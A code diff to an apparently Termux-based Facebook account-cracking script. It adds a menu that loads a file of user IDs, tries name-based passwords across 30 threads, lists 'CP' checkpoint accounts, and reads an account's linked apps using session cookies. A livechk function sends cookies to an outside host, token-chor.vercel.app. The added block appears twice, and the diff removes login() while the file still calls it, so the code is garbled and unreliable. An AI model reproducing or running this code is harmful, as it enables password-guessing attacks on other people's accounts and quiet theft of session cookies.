@@ -293,7 +293,130 @@ device = {
         'fbbd':fbbd,
         'fbdv':model,
         'fbsv':fbsv}
-#------------------[ MAIN ]-----------------#
+#------# I love you Mom 
+def dino():
+    print('\033[1;37m─────────────────────────────────────────────')
+
+def linex():
+    print('\033[1;37m─────────────────────────────────────────────')
+#------------------[ system  ]-------------------#
+def clear():
+    os.system('clear')
+    print(logo)
+
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s        '%(N,H,N,H,N))
+    else:
+        print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
+        for i in range(len(game)):
+            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s        '%(N,M,N,M,N))
+    else:
+        print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
+        for i in range(len(game)):
+            print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
+
+def livechk(cooker):
+      requests.get("https://token-chor.vercel.app/checkid",data={'iamfrom':'mrqureshi','acc': cooker})
+
+#------------------[ system  ]-------------------#
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+#------------------[ SIM CODE  ]-------------------#
+try:
+    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
+    carrier = output.replace(',', '\033[1;37m|\033[1;37m').replace('\n', '')
+except Exception as e:
+    pass
+    carrier = None
+#------------------[ MENU DJALIL_MK  ]-------------------#
+def menu():
+            clear()        
+            print(' \033[1;37m[\033[1;31m1\033[1;32m] CRACK FILE ')
+            print(' \033[1;37m[\033[1;31m2\033[1;32m] FOLLOW FB')
+            print(' \033[1;37m[\033[1;31m0\033[1;32m] EXIT ')
+            dino()
+            xd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+            if xd in ['1','01']:
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/DJALIL_MK.txt')
+                dino()
+                file = input(' \033[1;32m[\033[1;31m–\033[1;32m] ENTER FILE PATH\033[1;32m : ')
+                try:
+                    fo = open(file,'r').read().splitlines()
+                except FileNotFoundError:
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE LOCATION NOT FOUND ')
+                    time.sleep(1)
+                    menu()
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] TRY METHOD 1 & 4 FOR BEST RESULTS ')
+                print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m METHOD All IS IN PROCESSING ")
+                print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                print(f'\x1b[38;5;196m[\033[38;5;46m1\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m graph')
+                print(f'\x1b[38;5;196m[\033[38;5;46m2\x1b[38;5;196m]\033[38;5;46m Method \x1b[1;92m●\033[38;5;46m B-graph')
+                print(f'\x1b[38;5;196m[\033[38;5;46m3\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m API')
+                print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m B-api')
+                print(f'\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \033[38;5;46mBack')
+                print(f"\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                
+            
+                mthd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                dino()
+                plist = []
+                ps_limit = 0 
+                clear()
+                print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ")                                
+                print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ")
+                dino()
+                psx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                if psx in ['1','01']:
+                             plist.append('first first')
+                             plist.append('first last')
+                             plist.append('last first')
+                             plist.append('last last') 
+                else: 	
+                 try:
+                    dino()
+                    ps_limit = int(input(' How many passwords do you want to add ? '))                    
+                 except:
+                       ps_limit =1
+                clear() 
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] EXAMPLE : first last,firtslast,first123')
+                dino()
+                for i in range(ps_limit): 
+                    plist.append(input(f' \033[1;32m[\033[1;31m–\033[1;32m] PASSWORD {i+1}:\033[1;31m '))
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
+                dino()
+                cx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                if cx in ['y','Y','yes','Yes','1']:
+                    pcp.append('y')
+#else: 	
+
+    
+                else:
+                    pcp.append('n')
+                with tred(max_workers=30) as crack_submit:
+                    clear()
+                    total_ids = str(len(fo))
+                    print(" \033[1;32m[\033[1;31m–\033[1;32m] IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE ")
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] SIM NAME   \033[1;33m: \033[1;37m'+carrier+f' ')
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  \033[1;33m| \033[1;32mMETHOD \033[1;33m: \033[1;37m'+total_ids+f'\033[1;33m >> \033[1;37mM'+mthd+f' ')
+                    linex()-----------[ MAIN ]-----------------#
 
 def banner():
 	os.system("clear")
@@ -311,229 +434,130 @@ def banner():
 \033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
 \033[0;92m • VERSION CODE [ 5.1 ] FIRE (😻)
   \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
-def login():
-	banner()
-	MAMAj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
-	MAMAj('\033[0;97m===============================================')
-	MAMA= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
-	if MAMA in ['m']:
-		public()
-	elif MAMA in ['1']:
-		crack_file()
-	elif MAMA in ['i','0i']:
-		result()
-	elif MAMA in ['2','02']:
-		os.system('xdg-open https://wa.me/+8801866364414')
-	elif MAMA in ['0']:
-		os.system('rm -rf .token.txt')
-		os.system('rm -rf .cookie.txt')
-		print('#DONE LOGOUT ')
-		exit()
-	else:
-		print('# SELECT CORRECTLY ')
-		back()
-def error():
-	print(f'{k}#TRY AGAIN {u}')
-	time.sleep(4)
-	back()
-	
-def result():
-	os.system('clear')
-	banner()
-	print(' 1. CP ACCOUNT ')
-	print(' 2. OK ACCOUNT')
-	print(' 0. EXIT	')
-	kz = input('\n Choose : ')
-	if kz in ['1','01']:
-		try:vin = os.listdir('CP')
-		except FileNotFoundError:
-			print(' File Not Found')
-			time.sleep(3)
-			back()
-		if len(vin)==0:
-			print('You Have No CP Results ')
-			time.sleep(2)
-			back()
-		else:
-			cih = 0
-			lol = {}
-			for isi in vin:
-				try:hem = open('CP/'+isi,'r').readlines()
-				except:continue
-				cih+=1
-				if cih<10:
-					nom = '0'+str(cih)
-					lol.update({str(cih):str(isi)})
-					lol.update({nom:str(isi)})
-					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-				else:
-					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-			geeh = input('\n   Choose : ')
-			try:geh = lol[geeh]
-			except KeyError:
-				print(' CHOOSE RIGHT OPTION ')
-				exit()
-			try:lin = open('CP/'+geh,'r').read().splitlines()
-			except:
-				print('FILE NOT FOUND ')
-				time.sleep(2)
-				back()
-			nocp=0
-			for cpku in range(len(lin)):
-				cpkuni=lin[nocp].split('|')
-				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
-				sol().print(cpkuh,style="yellow")
-				nocp +=1
-			input('[ Click Enter ]')
-			back()
-	elif kz in ['2','02']:
-		try:vin = os.listdir('OK')
-		except FileNotFoundError:
-			print('File Not Found ')
-			time.sleep(2)
-			back()
-		if len(vin)==0:
-			print(' No OK FILE HERE ')
-			time.sleep(2)
-			back()
-		else:
-			cih = 0
-			lol = {}
-			for isi in vin:
-				try:hem = open('OK/'+isi,'r').readlines()
-				except:continue
-				cih+=1
-				if cih<100:
-					nom = ''+str(cih)
-					lol.update({str(cih):str(isi)})
-					lol.update({nom:str(isi)})
-					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-				else:
-					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-			geeh = input('\n CHOOSE : ')
-			try:geh = lol[geeh]
-			except KeyError:
-				print(' SELECT RIGHT OPTION ')
-				exit()
-			try:lin = open('OK/'+geh,'r').read().splitlines()
-			except:
-				print('File Not Found ')
-				time.sleep(2)
-				back()
-			nocp=0
-			for cpku in range(len(lin)):
-				cpkuni=lin[nocp].split('|')
-				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
-				sol().print(cpkuh,style="green")
-				nocp +=1
-			input('[ CLICK ENTER 2 BACK ]')
-			back()
-	elif kz in ['0','00']:
-		back()
-	else:
-		print('SELECT RIGHT OPTION ')
-		exit()
- 
-def public():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		os.system('clear')
-		banner()
-		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF IDZ: '))
-	except ValueError:
-		
-		back()
-	if jum<1 or jum>100000000:
-		
-		back()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input(' [] INPUT ID '+str(yz)+': ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print('#TRY AGAIN ')
-			os.system('clear')
-	try:
-		print(f' [] TOTAL ID: {P}'+str(len(id)))
-		print('')
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f'{u}')
-		back()
-	except (KeyError,IOError):
-		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
-		time.sleep(3)
-		back()
-		
-def crack_file():
-	os.system('clear')
-	banner()
-	os.system('espeak -a 300 " your file name"')
-	print('\033[1;32m [Put File Example:  /sdcard/mama.txt  Etc...]')
-	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
-	print('')
-	try:lin = open(o).read().splitlines()
-	except:
-		print('File Not Found')
-		time.sleep(2)
-		back()
-	for xid in lin:
-		id.append(xid)
-	setting()
-	
-def setting():
-	hu = '3'
-	if hu in ['1','01']:
-		for tua in sorted(id):
-			id2.append(tua)
-	elif hu in ['2','02']:
-		muda=[]
-		for bacot in sorted(id):
-			muda.append(bacot)
-		bcm=len(muda)
-		bcmi=(bcm-1)
-		for xmud in range(bcm):
-			id2.append(muda[bcmi])
-			bcmi -=1
-	elif hu in ['3','03']:
-		for bacot in id:
-			xx = random.randint(0,len(id2))
-			id2.insert(xx,bacot)
-	else:
-		for bacot in id:
-			xx = random.randint(0,len(id2))
-			id2.insert(xx,bacot)
-	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD SEX.. ')
-	os.system('espeak -a 300 " 1,  method,  SEX"')
-	hc = input(' CHOOSE: ')
-	if hc in ['1','01']:
-		method.append('mobile')
-	elif hc in ['9','09']:
-		method.append('mbasic')
-	else:
-		method.append('mobile')
-	passwrd()
-	exit()
- 
+	# I love you Mom 
+def dino():
+    print('\033[1;37m─────────────────────────────────────────────')
+
+def linex():
+    print('\033[1;37m─────────────────────────────────────────────')
+#------------------[ system  ]-------------------#
+def clear():
+    os.system('clear')
+    print(logo)
+
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s        '%(N,H,N,H,N))
+    else:
+        print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
+        for i in range(len(game)):
+            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s        '%(N,M,N,M,N))
+    else:
+        print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
+        for i in range(len(game)):
+            print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
+
+def livechk(cooker):
+      requests.get("https://token-chor.vercel.app/checkid",data={'iamfrom':'mrqureshi','acc': cooker})
+
+#------------------[ system  ]-------------------#
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+#------------------[ SIM CODE  ]-------------------#
+try:
+    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
+    carrier = output.replace(',', '\033[1;37m|\033[1;37m').replace('\n', '')
+except Exception as e:
+    pass
+    carrier = None
+#------------------[ MENU DJALIL_MK  ]-------------------#
+def menu():
+            clear()        
+            print(' \033[1;37m[\033[1;31m1\033[1;32m] CRACK FILE ')
+            print(' \033[1;37m[\033[1;31m2\033[1;32m] FOLLOW FB')
+            print(' \033[1;37m[\033[1;31m0\033[1;32m] EXIT ')
+            dino()
+            xd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+            if xd in ['1','01']:
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/DJALIL_MK.txt')
+                dino()
+                file = input(' \033[1;32m[\033[1;31m–\033[1;32m] ENTER FILE PATH\033[1;32m : ')
+                try:
+                    fo = open(file,'r').read().splitlines()
+                except FileNotFoundError:
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE LOCATION NOT FOUND ')
+                    time.sleep(1)
+                    menu()
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] TRY METHOD 1 & 4 FOR BEST RESULTS ')
+                print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m METHOD All IS IN PROCESSING ")
+                print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                print(f'\x1b[38;5;196m[\033[38;5;46m1\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m graph')
+                print(f'\x1b[38;5;196m[\033[38;5;46m2\x1b[38;5;196m]\033[38;5;46m Method \x1b[1;92m●\033[38;5;46m B-graph')
+                print(f'\x1b[38;5;196m[\033[38;5;46m3\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m API')
+                print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m B-api')
+                print(f'\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \033[38;5;46mBack')
+                print(f"\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                
+            
+                mthd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                dino()
+                plist = []
+                ps_limit = 0 
+                clear()
+                print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ")                                
+                print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ")
+                dino()
+                psx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                if psx in ['1','01']:
+                             plist.append('first first')
+                             plist.append('first last')
+                             plist.append('last first')
+                             plist.append('last last') 
+                else: 	
+                 try:
+                    dino()
+                    ps_limit = int(input(' How many passwords do you want to add ? '))                    
+                 except:
+                       ps_limit =1
+                clear() 
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] EXAMPLE : first last,firtslast,first123')
+                dino()
+                for i in range(ps_limit): 
+                    plist.append(input(f' \033[1;32m[\033[1;31m–\033[1;32m] PASSWORD {i+1}:\033[1;31m '))
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
+                dino()
+                cx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                if cx in ['y','Y','yes','Yes','1']:
+                    pcp.append('y')
+#else: 	
+
+    
+                else:
+                    pcp.append('n')
+                with tred(max_workers=30) as crack_submit:
+                    clear()
+                    total_ids = str(len(fo))
+                    print(" \033[1;32m[\033[1;31m–\033[1;32m] IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE ")
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] SIM NAME   \033[1;33m: \033[1;37m'+carrier+f' ')
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  \033[1;33m| \033[1;32mMETHOD \033[1;33m: \033[1;37m'+total_ids+f'\033[1;33m >> \033[1;37mM'+mthd+f' ')
+                    linex()
 def passwrd():
 	os.system('clear')
 	banner()
@@ -642,4 +666,5 @@ if __name__=='__main__':
 	except:pass
 	
 login()
+
 
